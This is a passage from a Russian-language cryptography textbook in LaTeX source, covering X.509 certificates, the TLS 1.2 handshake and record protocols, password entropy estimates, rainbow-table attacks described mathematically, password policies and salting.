Как видно, сертификат действителен с 26.03.2009 до 25.03.2010, открытый ключ представляет собой ключ RSA\index{криптосистема!RSA} с длиной модуля $n=$ 1024 бит и экспонентой $e = 65537$ и принадлежит компании Google Inc. Открытый ключ предназначен для взаимной аутентификации веб-сервера mail.google.com и веб-клиента в протоколе SSL/TLS. Сертификат подписан секретным ключом удостоверяющего центра Thawte SGC CA, подпись вычислена с помощью криптографического хэша SHA-1 и алгоритма RSA. В свою очередь, сертификат с открытым ключом Thawte SGC CA для проверки значения ЭП данного сертификата расположен по адресу http://www.thawte.com/repository/Thawte\_SGC\_CA.crt.

ЭП вычисляется от всех полей сертификата, кроме самого значения подписи.


\input{pgp}

\section{Защищенное интернет-соединение SSL/TLS}
\selectlanguage{russian}

Протокол SSL (Secure Sockets Layer) был разработан компанией Netscape. Начиная с версии 3, протокол развивается как открытый стандарт TLS (Transport Layer Security). Протокол SSL/TLS обеспечивает защищенное соединение по незащищенному каналу связи на прикладном уровне модели TCP/IP. Протокол встраивается между уровнем TCP и уровнями HTTP\index{протокол!HTTP}, FTP\index{протокол!FTP}, SMTP\index{протокол!SMTP}, POP3\index{протокол!POP3}, IMAP\index{протокол!IMAP} и т.д. Применение протокола обозначается добавлением суффикса 'S': HTTPS, FTPS, POP3S, IMAPS и т.д.

Протокол обеспечивает следующее.
\begin{itemize}
    \item Одностороннюю или взаимную аутентификацию клиента и сервера по открытым ключам сертификата X.509. В Интернете, как правило, делается \textbf{односторонняя} аутентификация веб-сервера браузеру клиента, то есть только веб-сервер предъявляет сертификат (открытый ключ и ЭП к нему от вышележащего УЦ).
    \item Создание сеансовых симметричных ключей для шифрования и кода аутентификации сообщения для передачи данных в обе стороны.
    \item Конфиденциальность -- блоковое или потоковое шифрование передаваемых данных в обе стороны.
    \item Целостность -- аутентификацию отправляемых сообщений в обе стороны имитовставкой\index{имитовставка} $\HMAC(K,M)$, описанной ранее.
\end{itemize}

Рассмотрим протокол TLS последней версии 1.2.


\subsection{Протокол <<рукопожатия>>}

Протокол <<рукопожатия>> (Handshake Protocol) производит аутентификацию и создание сеансовых ключей между клиентом $C$ и сервером $S$.

\begin{enumerate}
    \item $C \rightarrow S$:
        \begin{enumerate}
            \item ClientHello: ~ 1) URI сервера, ~ 2) Одноразовая метка $N_C$\index{одноразовая метка}, 3) ~ поддерживаемые алгоритмы шифрования, кода аутентификации сообщений, хэширования, ЭП и сжатия.
        \end{enumerate}

    \item $C \leftarrow S$:
        \begin{enumerate}
            \item ServerHello: одноразовая метка $N_S$, поддерживаемые алгоритмы сервера.

            После обмена набором желательных алгоритмов сервер и клиент по единому правилу выбирают общий набор алгоритмов.
            \item Server Certificate: сертификат X.509v3 сервера с запрошенным URI (URI нужен в случае нескольких виртуальных веб-серверов с разными URI на одном узле c одним IP адресом).
            \item Server Key Exchange Message: информация для создания предварительного общего секрета $premaster$ длиной 48 байтов в виде: ~ 1) либо обмена по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана} с клиентом (сервер отсылает $(g, g^a)$), ~ 2) либо по другому алгоритму с открытым ключом, ~ 3) либо разрешения клиенту выбрать ключ.
            \item Электронная подпись к Server Key Exchange Message на ключе сертификата сервера для аутентификации сервера клиенту.
            \item Certificate Request: опциональный запрос сервером сертификата клиента.
            \item Server Hello Done: идентификатор конца транзакции.
        \end{enumerate}

    \item $C \rightarrow S$:
        \begin{enumerate}
            \item Client Certificate: сертификат X.509v3 клиента, если он был запрошен сервером.
            \item Client Key Exchange Message: информация для создания предварительного общего секрета $premaster$ длиной 48 байтов в виде: ~ 1) либо обмена по протоколу Диффи~---~Хеллмана\index{протокол!Диффи~---~Хеллмана} с сервером (клиент отсылает $g^b$, в результате обе стороны вычисляют ключ $premaster = g^{ab}$), ~ 2) либо по другому алгоритму, ~ 3) либо ключа, выбранного клиентом и зашифрованного на открытом ключе из сертификата сервера.
            \item Электронная подпись к Client Key Exchange Message на ключе сертификата клиента для аутентификации клиента серверу (если клиент использует сертификат).
            \item Certificate Verify: результат проверки сертификата сервера.
            \item Change Cipher Spec: уведомление о смене сеансовых ключей.
            \item Finished: идентификатор конца транзакции.
        \end{enumerate}

    \item $C \leftarrow S$:
        \begin{enumerate}
            \item Change Cipher Spec: уведомление о смене сеансовых ключей.
            \item Finished: идентификатор конца транзакции.
        \end{enumerate}
\end{enumerate}

%      http://tools.ietf.org/html/rfc5246#page-37

%      struct {
%          ProtocolVersion client_version;
%          Random random;
%          SessionID session_id;
%          CipherSuite cipher_suites<2..2^16-2>;
%          CompressionMethod compression_methods<1..2^8-1>;
%          select (extensions_present) {
%              case false:
%                  struct {};
%              case true:
%                  Extension extensions<0..2^16-1>;
%          };
%      } ClientHello;

%      struct {
%          ProtocolVersion server_version;
%          Random random;
%          SessionID session_id;
%          CipherSuite cipher_suite;
%          CompressionMethod compression_method;
%          select (extensions_present) {
%              case false:
%                  struct {};
%              case true:
%                  Extension extensions<0..2^16-1>;
%          };
%      } ServerHello;

%      struct {
%          ASN.1Cert certificate_list<0..2^24-1>;
%      } Certificate;

%      struct {
%          select (KeyExchangeAlgorithm) {
%              case dh_anon:
%                  ServerDHParams params;
%              case dhe_dss:
%              case dhe_rsa:
%                  ServerDHParams params;
%                  digitally-signed struct {
%                      opaque client_random[32];
%                      opaque server_random[32];
%                      ServerDHParams params;
%                  } signed_params;
%              case rsa:
%              case dh_dss:
%              case dh_rsa:
%                  struct {} ;
%                 /* message is omitted for rsa, dh_dss, and dh_rsa */
%              /* may be extended, e.g., for ECDH -- see [TLSECC] */
%          };
%      } ServerKeyExchange;

%      struct {
%          ClientCertificateType certificate_types<1..2^8-1>;
%          SignatureAndHashAlgorithm
%            supported_signature_algorithms<2^16-1>;
%          DistinguishedName certificate_authorities<0..2^16-1>;
%      } CertificateRequest;

%      struct {
%          select (KeyExchangeAlgorithm) {
%              case rsa:
%                  EncryptedPreMasterSecret;
%              case dhe_dss:
%              case dhe_rsa:
%              case dh_dss:
%              case dh_rsa:
%              case dh_anon:
%                  ClientDiffieHellmanPublic;
%          } exchange_keys;
%      } ClientKeyExchange;

%      struct {
%           digitally-signed struct {
%               opaque handshake_messages[handshake_messages_length];
%           }
%      } CertificateVerify;

%      struct {
%          opaque verify_data[verify_data_length];
%      } Finished;

Одноразовые метки $N_C, N_S$ состоят из 32 байтов. Первые 4 байта -- текущее время, оставшиеся байты -- псевдослучайные. Псевдослучайная битовая строка формируется криптографическим псевдослучайным генератором чисел $PRF$.

Предварительный общий секрет $premaster$ длиной 48 байтов вместе с одноразовыми метками используется как инициализирующее значение генератора $PRF$ для получения общего секрета $master$ тоже длиной 48 байтов:
    \[ master = PRF(premaster, ~\text{текст ''master secret''}, ~ N_C + N_S) .\]

И наконец, уже из секрета $master$ таким же способом генерируется 6 окончательных сеансовых ключей, следующие друг за другом в битовой строке:
    \[ \{ (K_{E,1} ~\|~ K_{E,2}) ~\|~ (K_{\MAC,1} ~\|~ K_{\MAC,2}) ~\|~ (IV_1 ~\|~ IV_2) \} = \]
        \[ = PRF(master, ~\text{текст ''key expansion''}, ~ N_C + N_S), \]
где $K_{E,1}, ~ K_{E,2}$ -- два ключа симметричного шифрования, ~ $K_{\MAC,1}, ~ K_{\MAC,2}$ -- два ключа имитовставки\index{имитовставка}, ~ $IV_1, ~IV_2$ -- два инициализирующих вектора режима сцепления блоков\index{вектор инициализации}. Ключи с индексом 1 используются для коммуникации от клиента к серверу, с индексом 2 -- от сервера к клиенту.


\subsection{Протокол записи}

Протокол записи (Record Protocol) определяет формат TLS-пакетов для вложения в TCP-пакеты.

\begin{enumerate}
    \item Исходными сообщениями $M$ для шифрования являются пакеты протокола следующего уровня в модели OSI: HTTP\index{протокол!HTTP}, FTP\index{протокол!FTP}, IMAP\index{протокол!IMAP} и т.д.
    \item Сообщение $M$ разбивается на блоки $m_i$ не более 16 кБ.
    \item Блоки $m_i$ сжимаются алгоритмом компрессии в блоки $z_i$.
    \item Вычисляется имитовставка\index{имитовставка} для каждого блока $z_i$ и добавляется в конец блоков: $a_i = z_i ~\|~ \HMAC(K_{\MAC}, z_i)$.
    \item Блоки $a_i$ шифруются симметричным алгоритмом с ключом $K_E$ в некотором режиме сцепления блоков с инициализирующим вектором $IV$ в полное сжатое аутентифицированное зашифрованное сообщение $C$.
    \item К шифротексту $C$ добавляется заголовок протокола записи TLS и в результате получается TLS-пакет для вложения в TCP-пакет.
\end{enumerate}


\input{ipsec}

\section[Защита персональных данных в мобильной связи]{Защита персональных данных в \protect\\ мобильной связи}

\input{gsm2}

\input{gsm3}

%\section{Беспроводная сеть Wi-Fi}
%\subsection{WPA-PSK2, 802.11n, Radix?}
%\subsection{Wimax 802.16(?)}

\chapter{Аутентификация пользователя}


\section{Многофакторная аутентификация}

Для защищенных приложений применяется \textbf{многофакторная} аутентификация одновременно по факторам различной природы:
\begin{enumerate}
    \item Свойство, которым обладает субъект. Например, биометрия, природные уникальные отличия: лицо, отпечатки пальцев, радужная оболочка глаз, капиллярные узоры, последовательность ДНК.
    \item Знание -- информация, которую знает субъект. Например, пароль, PIN-код.
    \item Владение -- вещь, которой обладает субъект. Например, электронная или магнитная карта, флеш-память.
%    \item Факторы присвоения. Например, номер машины, RFID-метка.
\end{enumerate}

В обычных массовых приложениях из-за удобства использования применяется аутентификация только по \textbf{паролю}\index{пароль}, который является общим секретом пользователя и информационной системы. Биометрическая аутентификация по отпечаткам пальцев применяется существенно реже. Как правило, аутентификация по отпечаткам пальцев является дополнительным, а не вторым обязательным фактором (тоже из-за удобства ее использования).

%Так же явно или неявно используется аутентификация по факторам:
%\begin{enumerate}
%    \item Социальная сеть. Доверие к индивидууму в личном общении или интернет на основании общих связей.
%    \item Географическое положение. Например, для проверки оплаты товаров по кредитной карте.
%    \item Время. Доступ к сервисам или местам только в определенное время.
%    \item И др.
%\end{enumerate}


\section[Энтропия и криптостойкость паролей]{Энтропия и криптостойкость \protect\\ паролей}

Стандартный набор символов паролей, которые можно набрать на клавиатуре, используя английские буквы и небуквенные символы, состоит из $D=94$ символов. При длине пароля $L$ символов и предположении равновероятного использования символов энтропия паролей равна
    \[ H = L \log_2 D. \]

Клод Шеннон, исследуя энтропию символов английского текста, изучал вероятность успешного предсказания людьми следующего символа по первым нескольким символам слов или текста. В результате Шеннон получил оценку энтропии первого символа $s_1$ текста порядка $H(s_1) \approx 4{,}6$--$4{,}7$ бит/символ и оценки энтропий последующих символов, постепенно уменьшающиеся до $H(s_9) \approx 1{,}5$ бит/символ для 9-го символа. Энтропия для длинных текстов литературных произведений получила оценку $H(s_\infty) \approx 0{,}4$ бит/символ.

Статистические исследования баз паролей показывают, что наиболее часто используются буквы <<a>>, <<e>>, <<o>>, <<r>> и цифра <<1>>.

NIST использует следующие рекомендации для оценки энтропии паролей\index{энтропия!пароля}, создаваемых людьми.
\begin{enumerate}
    \item Энтропия первого символа $H(s_1) = 4$ бит/символ.
    \item Энтропия со 2-го по 8-й символы $H(s_{2 \leq i \leq 8}) = 2$ бит/символ.
    \item Энтропия с 9-го по 20-й символы $H(s_{9 \leq i \leq 20}) = 1{,}5$ бит/символ.
    \item Энтропия с 21-го символа $H(s_{i \geq 21}) = 1$ бит/символ.
    \item Проверка композиции на использование символов разных регистров и небуквенных символов добавляет до 6 бит энтропии пароля.
    \item Словарная проверка на слова и часто используемые пароли добавляет до 6 бит энтропии для коротких паролей. Для 20-символьных и более длинных паролей прибавка к энтропии 0 бит.
\end{enumerate}

Для оценки энтропии пароля нужно сложить энтропии символов $H(s_i)$ и сделать дополнительные надбавки, если пароль удовлетворяет тестам на композицию и отсутствие в словаре.

\begin{table}[!ht]
    \centering
    \caption{Оценка NIST предполагаемой энтропии паролей\label{tab:password-entropy}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c||c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{Длина пароля, символы}} & \multicolumn{3}{|c||}{\parbox{6cm}{Энтропия паролей пользователей по критериям NIST}} & \multirow{2}{*}{\parbox{2.5cm}{Энтропия случайных равновероятных паролей}} \\
        \cline{2-4}
        & \parbox{1.5cm}{Без проверок} & \parbox{2cm}{Словарная проверка} & \parbox{2.5cm}{Словарная и композиционная проверка} & \\
        \hline
        4  & 10 & 14 & 16 & 26.3 \\
        6  & 14 & 20 & 23 & 39.5 \\
        8  & 18 & 24 & 30 & 52.7 \\
        10 & 21 & 26 & 32 & 65.9 \\
        12 & 24 & 28 & 34 & 79.0 \\
        16 & 30 & 32 & 38 & 105.4 \\
        20 & 36 & 36 & 42 & 131.7 \\
        24 & 40 & 40 & 46 & 158.0 \\
        30 & 46 & 46 & 52 & 197.2 \\
        40 & 56 & 56 & 62 & 263.4 \\
        \hline
    \end{tabular} }
\end{table}

В табл. \ref{tab:password-entropy} приведена оценка NIST на величину энтропии пользовательских паролей в зависимости от их длины и сравнение с энтропией случайных паролей с равномерным распределением символов из набора в $D=94$ символов клавиатуры. Вероятное число попыток для подбора пароля составляет $O(2^H)$. Из таблицы видно, что по критериям NIST энтропия реальных паролей в 2--4 раза меньше энтропии случайных паролей с равномерным распределением символов.

\example
Оценим общее количество существующих паролей. Население Земли -- 7 млрд. Предположим, что все население использует компьютеры, Интернет, и у каждого человека по 10 паролей. Общее количество существующих паролей -- $7 \cdot 10^{10} \approx 2^{36}$.
%Следовательно, \emph{реальная энтропия паролей не превышает 36 бит}.

Имея доступ к наиболее массовым интернет-сервисам с количеством пользователей десятки и сотни миллионов, в которых пароли часто хранятся в открытом виде из-за необходимости обновления ПО и, в частности, выполнения аутентификации, мы 1) имеем базу паролей, покрывающую существенную часть пользователей, 2) можем статистически построить правила генерирования паролей. Даже если пароль хранится в защищенном виде, то при вводе пароль, как правило, в открытом виде пересылается по Интернету, и все преобразования пароля для аутентификации осуществляет интернет-сервис, а не веб-браузер. Следовательно, интернет-сервис имеет доступ к исходному паролю.
\exampleend

В 2002 г. был подобран ключ для 64-битового блокового шифра RC5 сетью \texttt{distributed.net} персональных компьютеров, выполнявших вычисления в фоновом режиме. Суммарное время вычислений всех компьютеров -- 1757 дней, было проверено 83\% пространства всех ключей. Это означает, что пароли с оценочной энтропией менее 64 бит, то есть \emph{все пароли} до 40 символов по критериям NIST, могут быть подобраны в настоящее время. Конечно, с оговорками на то, что 1) нет ограничений на количество и скорость попыток аутентификаций, 2) алгоритм генерирования вероятных паролей эффективен.

Строго говоря, использование даже 40-символьного пароля для аутентификации или в качестве ключа блокового шифрования является небезопасным.


\subsubsection{Число паролей}

Приведем различные оценки числа паролей, создаваемых людьми.

Пароли, создаваемые людьми, основаны на словах или закономерностях естественного языка. В английском языке всего около $1\ 000\ 000 \approx 2^{20}$ слов, включая термины.

%http://www.springerlink.com/content/bh216312577r6w64/fulltext.pdf
%http://www.antimoon.com/forum/2004/4797.htm

Используемые слоги английского языка имеют вид V, CV, VC, CVV, VCC, CVC, CCV, CVCC, CVCCC, CCVCC, CCCVCC, где C -- согласная (consonant), V -- гласная (vowel). 70\% слогов имеют структуру VC или CVC. Общее число слогов $S = 8000 - 12000$. Средняя длина слога -- 3 буквы.

Предполагая равновероятное распределение всех слогов английского языка, для числа паролей из $r$ слогов получим верхнюю оценку
    \[ N_1 = S^r = 2^{13 r} \approx 2^{4.3 L_1}. \]
Средняя длина паролей составит
    \[ L_1 \approx 3 r. \]

Теперь предположим, что пароли могут состоять только из 2--3 буквенных слогов вида CV, VC, CVV, VCC, CVC, CCV с равновероятным распределением символов. Подсчитаем число паролей $N_2$, которые могут быть построены из $r$ таких слогов. В английском алфавите $n_v = 10, n_c = 16, n = n_v + n_c = 26$. Верхняя оценка числа $r$-слоговых паролей:
    \[ N_2 = (n_c n_v + n_v n_c + n_c n_v n_v + n_v n_c n_c + n_c n_v n_c + n_c n_c n_v)^r \approx \]
        \[ \approx \left( n_c n_v(3 n_c + n_v) \right)^r, \]
    \[ N_2 \approx \left( \frac{n^3}{2} \right)^r \approx 2^{13 r} \approx 2^{4.3 L_2}. \]
Средняя длина паролей:
    \[ L_2 = \frac{n_c n_v(2 + 2 + 3 n_v + 3 n_c + 3 n_c + 3 n_c)}{n_c n_v (1 + 1 + n_v + n_c + n_c + n_c)} \cdot r \approx 3 r. \]

Как видно, получились одинаковые оценки числа и длины паролей.

Подсчитаем верхние оценки числа паролей из $L$ символов, предполагая равномерное распределение символов из алфавита в $D$ символов: a) $D_1 = 26$ строчных буквы, б) все $D_2 = 94$ печатных символа клавиатуры (латиница и небуквенные символы):
    \[ N_3 = D_1^L \approx 2^{4.7 L}, \]
    \[ N_4 = D_2^L \approx 2^{6.6 L}. \]

\begin{table}[!ht]
    \centering
    \caption{Различные верхние оценки числа паролей\label{tab:password-number}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{Длина пароля}} & \multicolumn{3}{|c|}{Число паролей} \\
        \cline{2-4}
            & \parbox{3cm}{На основе слоговой композиции} &
            \parbox{3cm}{Алфавит $D=26$ символов} &
            \parbox{3cm}{Алфавит $D=94$ символа} \\
        \hline \hline
        6  & $2^{26}$ & $2^{28}$ & $2^{39}$ \\
        9  & $2^{39}$ & $2^{42}$ & $2^{59}$ \\
        12 & $2^{52}$ & $2^{56}$ & $2^{79}$ \\
        15 & $2^{65}$ & $2^{71}$ & $2^{98}$ \\
        \hline
        21 & $2^{91}$ & $2^{99}$ & $2^{137}$ \\
        \hline
        39 & $2^{169}$ & $2^{183}$ & $2^{256}$ \\
        \hline
    \end{tabular} }
\end{table}

Из таблицы \ref{tab:password-number} видно, что при доступном объеме вычислений в $2^{60 \ldots 70}$ операций, пароли вплоть до 15 символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшом изменении регистров и других простейших модификациях, могут быть найдены перебором на кластере (или ПК) в настоящее время.

Для достижения криптостойкости паролей, сравнимой со 128- или 256-битовым секретным ключом, требуется выбирать пароль из 20 и 40 символов соответственно, что, как правило, не реализуется из-за сложности запоминания и ввода без ошибок.


%Подсчитаем число паролей $N_1$, которые могут могут построены из $r$ ~ 2-3 буквенных слогов: $cv, vc, ccv, cvc, vcc$, где $c$ -- согласная, $v$ -- гласная. В английском алфавите $n_v = 10, n_c = 16, n = n_v + n_c = 26$. Число паролей
%    \[ N_1 = \left( n_v n_c (1 + 1 + n_c + n_c + n_c) \right)^r \approx 3^r n_v^r n_c^{2r}. \]
%Средняя длина паролей
%    \[ L = r \left( \frac{2 + 2 + 3 n_c + 3 n_c + 3 n_c}{1 + 1 + n_c + n_c + n_c} \right) \approx 3r. \]
%
%%Учтем, что $b \leq r$ символов могут быть заглавными: $N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{n}{n_v} \right)^b$. Вставим $d$ цифр в случайные места: $N_2 \rightarrow N_3 = N_2 (10 (1 + L))^d \approx N_2 (10 L)^d$.
%%
%%Общее число паролей
%%    \[ N = N_3 = 3^r 10^r 16^{2r} \binom{3r}{b} 2.6^b \left(10 \cdot 3 r \right)^d. \]
%%
%%\begin{table}[!ht]
%%    \centering
%%    \small
%%    \begin{tabular}{|c|c|c|c|c||cr|}
%%        \hline
%%        \parbox{1.3cm}{Слогов, $r$} & \parbox{1.8cm}{Заглавных букв, $b$} & \parbox{1.5cm}{Вставок цифр, $d$} & \parbox{2.8cm}{Средняя длина пароля, $L+d$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей}} \\
%%        \hline
%%        $2$ & $0$ & $0$ & $6$ & $2^{26}$ & $2^{36}$ & a-z \\
%%        $2$ & $2$ & $0$ & $6$ & $2^{32}$ & $2^{48}$ & A-Z, a-z \\
%%        $2$ & $2$ & $2$ & $8$ & $2^{45}$ & $2^{48}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $3$ & $0$ & $0$ & $9$ & $2^{39}$ & $2^{54}$ & a-z \\
%%        $3$ & $3$ & $0$ & $9$ & $2^{49}$ & $2^{54}$ & A-Z, a-z \\
%%        $3$ & $3$ & $2$ & $11$ & $2^{63}$ & $2^{65}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $4$ & $0$ & $0$ & $12$ & $2^{52}$ & $2^{93}$ & a-z \\
%%        $4$ & $3$ & $0$ & $12$ & $2^{64}$ & $2^{186}$ & A-Z, a-z \\
%%        $4$ & $3$ & $2$ & $14$ & $2^{78}$ & $2^{222}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%    \end{tabular}
%%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей.}
%%    \label{tab:password-number}
%%\end{table}
%
%Учтем, что $b$ символов в пароле могут быть взяты не из 26-символьного алфавита строчных букв, а из всего алфавита в $D=94$ печатных символа клавиатуры (латиница и небуквенные символы):
%\[
%    \begin{array}{ll}
%    b=1 & N_1 \rightarrow N_2 = \frac{n_v}{n_v+n_c} 3^r n_v^{r-1} n_c^{2r} \cdot L. \]
%
%    \[ N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{D}{n_v} \right)^b. \]
%
%
%
%Общее число паролей
%    \[ N < 3^r n_v^r n_c^{2r} \binom{L}{b} \left( \frac{D}{n_v} \right)^b = 3^r 10^r 16^{2r} \binom{3r}{b} \left( \frac{94}{10} \right)^b. \]
%
%\begin{table}[!ht]
%    \centering
%    \small
%    \begin{tabular}{|c|c|c|c||cr|}
%        \hline
%        \parbox{1.5cm}{Слогов, $r$} & \parbox{3cm}{Средняя длина пароля, $L$} & \parbox{3cm}{Символов из всего алфавита, $b$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей, $D^L$}} \\
%        \hline
%        \multirow{3}{*}{2} & \multirow{3}{*}{6} & $0$ & $2^{26}$ & $2^{28}$ & a-z \\
%        & & $1$ & $2^{32}$ & $2^{34}$ & A-Z, a-z \\
%        & & $3$ & $2^{40}$ & $2^{39}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{3} & \multirow{3}{*}{9} & $0$ & $2^{39}$ & $2^{42}$ & a-z \\
%        & & $2$ & $2^{50}$ & $2^{51}$ & A-Z, a-z \\
%        & & $4$ & $2^{59}$ & $2^{59}$ & Весь алфавит \\
%        \hline
%        \multirow{3}{*}{4} & \multirow{3}{*}{12} & $0$ & $2^{52}$ & $2^{56}$ & a-z \\
%        & & $3$ & $2^{69}$ & $2^{68}$ & A-Z, a-z \\
%        & & $6$ & $2^{81}$ & $2^{77}$ & Весь алфавит \\
%        \hline
%    \end{tabular}
%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей в алфавите из $D$ символов.}
%    \label{tab:password-number}
%\end{table}
%
%Из таблицы \ref{tab:password-number} видно, что при доступном объеме вычислений в $2^{60 \ldots 70}$ операций, пароли вплоть до 12 символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшого изменения регистров и другой простейшей обфускации, могут быть найдены перебором на кластере (или ПК) в настоящее время.


\subsubsection{Атака для подбора паролей и ключей шифрования}

В схемах аутентификации по паролю иногда используется хэширование и хранение хэша пароля на сервере. В таких случаях применима словарная атака или атака с применением заранее вычисленных таблиц для ускорения поиска.

Для нахождения пароля, прообраза хэш-функции, или для нахождения ключа блокового шифрования по атаке с выбранным шифротекстом (для одного и того же известного открытого текста и соответствующего шифротекста) может быть применен метод перебора с балансом между памятью и временем вычислений. Самый быстрый метод радужных таблиц (rainbow tables)\index{радужные таблицы}, 2003 г., заранее вычисляет следующие цепочки и хранит результат в памяти.

Для нахождения пароля, прообраза хэш-функции $H$, цепочка строится как
    \[ M_0 \xrightarrow{H(M_0)} h_0 \xrightarrow{R_0(h_0)} M_1 \ldots M_t \xrightarrow{H(M_t)} h_t \xrightarrow{R_t(h_t)} M_{t+1}, \]
где $R_i(h)$ -- функция редуцирования, преобразования хэша в пароль для следующего хэширования.

Для нахождения ключа блокового шифрования для одного и того же известного открытого текста $M$ таблица строится как
    \[ K_0 \xrightarrow{E_{K_0}(M)} c_0 \xrightarrow{R_0(c_0)} K_1 \ldots K_t \xrightarrow{E_{K_t}(M)} c_t \xrightarrow{R_t(c_t)} K_{t+1}, \]
где $R_i(c)$ -- функция редуцирования, преобразования шифротекста в новый ключ.

Функция редуцирования $R_i$ зависит от номера итерации, чтобы избежать дублирующиеся подцепочки, которые возникают в случае коллизий между значениями в разных цепочках в разных итерациях, если $R$ постоянна. Rainbow-таблица размера $(m \times 2)$ состоит из строк $(M_{0,j}, M_{t+1,j})$ или $(K_{0,j}, K_{t+1,j})$, вычисленных для разных значений стартовых паролей $M_{0,j}$ или $K_{0,j}$ соответственно.

Опишем атаку на примере нахождения прообраза $\overline{M}$ хэша $\overline{h} = H(\overline{M})$. На первой итерации исходный хэш $\overline{h}$ редуцируется в сообщение $\overline{h} \xrightarrow{R_t(\overline{h})} \overline{M}_{t+1} $ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если нет совпадения, переходим ко второй итерации. Хэш $\overline{h}$ дважды редуцируется в сообщение $\overline{h} \xrightarrow{R_{t-1}(\overline{h})} \overline{M}_t \xrightarrow{H(\overline{M}_t)} \overline{h}_t \xrightarrow{R_t(\overline{h}_t)} \overline{M}_{t+1}$ и сравнивается со всеми значениями последнего столбца $M_{t+1,j}$ таблицы. Если не совпало, то переходим к третьей итерации и т.д. Если для $r$-кратного редуцирования сообщение $\overline{M}_{t+1}$ содержится в таблице во втором столбце, то из совпавшей строки берется $M_{0,j}$, и вся цепочка пробегается заново для поиска искомого сообщения $\overline{M}: ~ \overline{h} = H(\overline{M})$.

Найдем вероятность нахождения пароля в таблице. Пусть мощность множества всех паролей $N$. Изначально в столбце $M_{0,j}$ содержится $m_0 = m$ различных паролей. Предполагая случайное отображение с пересечениями паролей $M_{0,j} \rightarrow M_{1,j}$, в $M_{1,j}$ будет $m_1$ различных паролей. Согласно задаче о размещении,
\[
    m_{i+1} = N \left( 1 - \left( 1 - \frac{1}{N} \right)^{m_i} \right) \approx N \left( 1 - e^{-\frac{m_i}{N}} \right).
\]
Вероятность нахождения пароля
\[
    P = 1 - \prod \limits_{i=1}^t \left( 1 - \frac{m_i}{N} \right).
\]

Чем больше таблица из $m$ строк, тем больше шансов найти пароль или ключ, выполнив в наихудшем случае   $O \left( m \frac{t(t+1)}{2} \right)$ операций.

Примеры применения атаки на хэш-функциях $\textrm{MD5}$\index{MD5}, $\textrm{LM} \sim \textrm{DES}_{\textrm{Password}} (\textrm{const})$ приведены в табл. \ref{tab:rainbow-tables}.

\begin{table}[!ht]
    \centering
    \caption{Атаки на радужных таблицах на \emph{одном} ПК\label{tab:rainbow-tables}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c|c|c|c|c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.0cm}{Длина, биты}} & \multicolumn{3}{|c|}{Пароль или ключ} &
            \multicolumn{3}{|c|}{Радужная таблица} \\
        \cline{2-7}
        & \parbox{1.2cm}{Длина, симв.} & \parbox{1cm}{Множе- ство} & \parbox{1cm}{Мощн- ость} &
            Объем & \parbox{1.5cm}{Время вычисления таблиц} & \parbox{1.3cm}{Время поиска} \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш LM} \\
        \hline
        \multirow{3}{*}{$2 \times 56$} & \multirow{3}{*}{14} &
            A--Z & $2^{33}$ & 610 MB &  & 6 с \\
        & & A--Z, 0-9 & $2^{36}$ & 3 GB &  & 15 с \\
        & & все & $2^{43}$ & 64 GB & \parbox{1.5cm}{несколько лет} & 7 мин \\
        \hline \hline
        \multicolumn{7}{|c|}{Хэш MD5} \\
        \hline
        128 & 8 & a-z, 0-9 & $2^{41}$ & 36 GiB & - & 4 мин \\
        \hline
    \end{tabular} }
\end{table}


\section{Аутентификация по паролю}

Из-за малой энтропии пользовательских паролей во всех системах регистрации и аутентификации пользователей применяется специальная политика безопасности. Типичные минимальные требования:
\begin{enumerate}
    \item Длина пароля от 8 символов. Использование разных регистров и небуквенных символов в паролях. Запрет паролей из словаря слов или часто используемых паролей. Запрет паролей в виде дат, номеров машин и других номеров.
    \item Ограниченное время действия пароля. Обязательная смена пароля по истечении срока действия.
    \item Блокирование возможности аутентификации после нескольких неудачных попыток. Ограниченное число актов аутентификаций в единицу времени. Временная задержка перед выдачей результата аутентификации.
\end{enumerate}

Дополнительные рекомендации (требования) пользователям:
\begin{enumerate}
    \item Не использовать одинаковые или похожие пароли для разных систем. Например, электронная почта, вход в ОС, электронная платежная система, форумы, социальные сети. Пароль часто передается в открытом виде по сети. Пароль доступен администратору системы, возможны утечки конфиденциальной информации с серверов. Стараться выбирать случайные стойкие пароли.
    \item Не записывать пароли. Никому не сообщать пароль, даже администратору. Не передавать пароли по почте, телефону, Интернету и т.д.
    \item Не использовать одну и ту же учетную запись для разных пользователей даже в виде исключения.
    \item Всегда блокировать компьютер, когда пользователь отлучается от него даже на короткое время.
\end{enumerate}

\section[Хранение паролей и аутентификация в ОС]{Хранение паролей и \protect\\ аутентификация в ОС}
\selectlanguage{russian}

Для усложнения подбора пароля и избежания словарной атаки используется добавление перед хэшированием к паролю <<соли>> -- случайной битовой строки. \textbf{Солью} (salt)\index{соль} называется (псевдо)случайная битовая строка $s$, добавляемая к аргументу $m$ (паролю) функции хэширования $h(m)$ для рандомизации хэширования одинаковых сообщений.

